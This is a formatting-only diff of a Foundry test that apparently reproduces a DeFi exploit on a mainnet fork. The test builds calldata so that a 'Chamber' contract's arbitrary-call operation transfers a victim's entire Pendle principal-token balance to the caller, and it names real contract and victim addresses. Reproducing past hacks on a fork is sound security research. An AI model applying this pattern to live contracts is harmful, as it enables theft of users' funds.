@@ -21,16 +21,13 @@ interface IChamber {
 }
 
 contract ContractTest is Test {
-    IChamber private constant Chamber =
-        IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
-    IERC20 private constant PendlePrincipalToken =
-        IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
-    address private constant victim =
-        0x9CBF099ff424979439dFBa03F00B5961784c06ce;
+    IChamber private constant Chamber = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
+    IERC20 private constant PendlePrincipalToken = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
+    address private constant victim = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;
     uint8 public constant OPERATION_CALL = 30;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19325936);
+        vm.createSelectFork("mainnet", 19_325_936);
         vm.label(address(Chamber), "Chamber");
         vm.label(address(PendlePrincipalToken), "PendlePrincipalToken");
         vm.label(victim, "victim");
@@ -39,19 +36,9 @@ contract ContractTest is Test {
     function testExploit() public {
         // Datas
         uint256 amount = PendlePrincipalToken.balanceOf(victim);
-        bytes memory callData = abi.encodeWithSignature(
-            "transferFrom(address,address,uint256)",
-            victim,
-            address(this),
-            amount
-        );
-        bytes memory data = abi.encode(
-            address(PendlePrincipalToken),
-            callData,
-            uint256(0),
-            uint256(0),
-            uint256(0)
-        );
+        bytes memory callData =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
+        bytes memory data = abi.encode(address(PendlePrincipalToken), callData, uint256(0), uint256(0), uint256(0));
         bytes[] memory datas = new bytes[](1);
         datas[0] = data;
 
